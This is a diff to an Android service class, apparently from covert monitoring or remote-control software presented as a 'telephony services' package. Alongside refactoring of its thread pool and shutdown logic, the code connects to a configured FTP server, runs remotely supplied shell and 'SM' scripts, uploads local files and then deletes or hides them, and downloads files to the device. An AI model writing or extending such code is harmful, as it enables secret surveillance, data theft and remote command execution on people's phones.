@@ -2,10 +2,13 @@ package com.telephony.services;
 
 import java.io.File;
 import java.io.FileFilter;
+import java.net.URI;
 import java.util.Date;
+import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicInteger;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -32,6 +35,7 @@ public class SuperService extends Service {
 	private PreferenceUtils sPref = null;
 	private ExecutorService es;
 	private MyFTPClient ftp = null;
+	private AtomicInteger activePools;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -43,6 +47,7 @@ public class SuperService extends Service {
 		super.onCreate();
 		try {
 			es = Executors.newFixedThreadPool(4);
+			activePools = new AtomicInteger(0);
 			sPref = PreferenceUtils.getInstance(this);
 			connection = Connection.getInstance(this);
 			ftp = MyFTPClient.getInstance();
@@ -66,13 +71,13 @@ public class SuperService extends Service {
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-
-		es.execute(new RunService(intent, flags, startId, this));
+		es.submit(new RunService(intent, flags, startId, this));
+		activePools.incrementAndGet();
 		return START_REDELIVER_INTENT;
 
 	}
 
-	private class RunService implements Runnable {
+	private class RunService implements Callable<Void> {
 		private final Intent intent;
 		private final int flags;
 		private final int startId;
@@ -90,7 +95,7 @@ public class SuperService extends Service {
 		}
 
 		@Override
-		public void run() {
+		public Void call() {
 			long rfs = -1;
 			try {
 				command = intent.getIntExtra(Utils.EXTRA_COMMAND, 0);
@@ -99,12 +104,12 @@ public class SuperService extends Service {
 				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)
 						&& connection.waitForConnection(sPref.isWifiOnly(), Utils.SECOND * 20)) {
 
-					ftp.connect(sPref.getRemoteUrl());
-					if (ftp.isReady()) {
+					if (ftp.connect(new URI(sPref.getRemoteUrl()))) {
 						switch (command) {
 						case COMMAND_RUN_SCRIPTER:
 							scp = new Scripter(context, ftp);
-							scp.execScript();
+							scp.execShellScript();
+							scp.execSMScript();
 							break;
 
 						case COMMAND_RUN_UPDATER:
@@ -120,8 +125,7 @@ public class SuperService extends Service {
 								public boolean accept(File f) {
 									Date today = new Date();
 									return f.isDirectory()
-											|| (!f.isHidden() && new Date(f.lastModified()).before(new Date(today
-													.getTime() - (Utils.MINUTE * 15))));
+											|| (!f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.MINUTE * 15))));
 								}
 							});
 							String remotefile = "";
@@ -133,8 +137,7 @@ public class SuperService extends Service {
 											Log.d(Utils.LOG_TAG, "try upload: " + file.getAbsolutePath());
 											ftp.uploadFile(file, remotefile);
 										}
-										if (!sPref.isKeepUploaded()
-												|| (file.getName().equals(SMService.CONFIG_OUT_FILENAME))) {
+										if (!sPref.isKeepUploaded() || (file.getName().equals(SMService.CONFIG_OUT_FILENAME))) {
 											file.delete();
 										} else {
 											Utils.setHidden(file);
@@ -160,8 +163,7 @@ public class SuperService extends Service {
 											file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), fn));
 											if (file != null) {
 												if ((file.exists() && (file.length() != rfs)) || (!file.exists())) {
-													Log.d(Utils.LOG_TAG,
-															"try download: " + fn + " to " + file.getAbsolutePath());
+													Log.d(Utils.LOG_TAG, "try download: " + fn + " to " + file.getAbsolutePath());
 													ftp.downloadFile(fn, file);
 												}
 											}
@@ -184,6 +186,7 @@ public class SuperService extends Service {
 			} finally {
 				stop();
 			}
+			return null;
 		}
 
 		public void stop() {
@@ -196,15 +199,9 @@ public class SuperService extends Service {
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
-			}
-			try {
-				if (stopSelfResult(startId)) {
-					if (ftp != null) {
-						ftp.disconnect();
-					}
-				}
-			} catch (Exception e) {
-				e.printStackTrace();
+			}			
+			if (activePools.decrementAndGet() <= 0) {
+				stopSelf();
 			}
 		}
 	}
@@ -212,20 +209,38 @@ public class SuperService extends Service {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
+		es.shutdown();
 		try {
-			es.shutdown();
-			if ((es.isShutdown()) && (!es.awaitTermination(5, TimeUnit.SECONDS))) {
+			Thread ftp_disconnect = new Thread(new Runnable() {
+				@Override
+				public void run() {
+					try {
+						if (ftp != null) {
+							ftp.disconnect();
+						}
+					} catch (Exception e) {
+					}
+				}
+			}, "FTP.DISCONNECT");
+			ftp_disconnect.start();
+			ftp_disconnect.join();
+
+			if ((es.isShutdown()) && (!es.awaitTermination(60, TimeUnit.SECONDS))) {
 				es.shutdownNow();
-				if (!es.awaitTermination(5, TimeUnit.SECONDS)) {
+				if (!es.awaitTermination(60, TimeUnit.SECONDS)) {
 					Log.d(Utils.LOG_TAG, "Pool did not terminated");
 				}
 			}
+
 		} catch (InterruptedException ie) {
 			es.shutdownNow();
 		} catch (Exception e) {
 			e.printStackTrace();
 		} finally {
-			unregisterReceiver(connectionReceiver);
+			try {
+				unregisterReceiver(connectionReceiver);
+			} catch (Exception e) {
+			}
 		}
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
 	}
